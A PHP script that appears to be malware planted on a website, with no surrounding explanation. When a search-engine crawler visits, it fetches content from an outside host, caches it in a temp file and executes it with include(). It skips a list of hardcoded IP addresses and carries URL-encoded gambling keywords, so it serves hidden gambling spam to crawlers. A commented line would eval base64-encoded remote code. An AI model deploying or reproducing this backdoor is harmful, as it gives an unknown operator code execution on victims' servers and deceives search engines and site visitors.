<?php
/*
$str = "www.ag918.org";
echo md5($str);
echo dirname(__FILE__);
define('ROOT_PATH',substr(dirname(__FILE__),0,-8));
echo ROOT_PATH;
*/
//print_r(base64_decode(file_get_contents(base64_decode('aHR0cDovL3d3dy5pcGEuY29tLmRlL2JjdC5naWY='))));

error_reporting(0); 
date_default_timezone_set('PRC'); 
$IP=$_SERVER['REMOTE_ADDR']; 
$Bot=$_SERVER['HTTP_USER_AGENT']; 
$Ref=$_SERVER['HTTP_REFERER']; 
$Host=$_SERVER['HTTP_HOST']; 
$Url=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']; 
$KIP=array(
	'117.28.255.37',
	'116.55.241.24',
	'125.64.94.219',
	'119.147.114.213',
	'118.122.188.194',
	'60.172.229.61',
	'61.188.39.16',
	'61.147.98.198',
	'61.129.45.72',
	'113.98.254.245',
	'58.221.61.128',
	'117.34.73.70',
	'58.215.190.84',
	'117.28.255.53',
	'183.91.40.144',
	'117.21.220.245',
	'122.228.200.46',
	'61.164.150.70',
	'61.147.108.41',
	'116.55.242.138',
	'114.80.222.242',
	'61.147.108.41',
	'116.255.230.70','222.186.24.26','222.186.24.59','220.181.158.106','123.125.160.215'); 
$KBot=array('Baiduspider','Googlebot','Yahoo','Bingbot','Sosospider','Sogou','360Spider','YoudaoBot'); 
$Key=array(
	'anquan.org','%e8%b5%8c','%E9%AA%B0%E5%AE%9D',
	'%e5%8d%9a%e5%bd%a9','%e6%a3%8b%e7%89%8c',
	'%E5%A8%B1%E4%B9%90','%e7%9c%9f%e4%ba%ba','%e7%9c%9f%e9%92%b1','%e7%8e%b0%e9%87%91',
	'%e5%bc%80%e6%88%b7','%e5%bd%a9%e9%87%91','%e6%8f%90%e7%8e%b0','%e5%a4%aa%e9%98%b3%e5%9f%8e',
	'%e4%bd%93%e9%aa%8c%e9%87%91','%E8%B6%B3%E7%90%83','%E6%8A%95%E6%B3%A8','%E8%B6%B3%E5%BD%A9',
	'%E7%99%BE%E5%AE%B6%E4%B9%90','%E6%96%97%E5%9C%B0%E4%B8%BB','%E8%BD%AE%E7%9B%98','%E6%B3%A2%E9%9F%B3','bbin'); 

function cache(){ 
	if(file_exists('/var/tmp/')){
			$dir='/var/tmp/';
	}elseif(file_exists('/tmp/')){
		$dir='/tmp/';
	}
	else{
		$dir='c:/windows/temp/';
	} 
	$html=file_get_contents('http://bct.ipa.com.de/?Host='.$_SERVER['HTTP_HOST'].'&Url='.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']); 
	$file=$dir.sha1($_SERVER['REQUEST_URI']).'.log'; 
	if(!file_exists($file)){
		$Open=fopen($file,'wb');
		fwrite($Open,$html);
		fclose($Open);
	} 
	exit(include($file)); 
} 

if(!in_array($IP,$KIP)){
	foreach($KBot as $KBots){
		if(stristr($Bot,$KBots)){
			cache();
		}
	}foreach($Key as $Keys){
		if(stristr($Ref,$Keys)){
			echo "";
		}
	}
}

//@Eval(base64_decode(file_get_contents(base64_decode('aHR0cDovL3d3dy5pcGEuY29tLmRlL2JjdC5naWY='))));
?>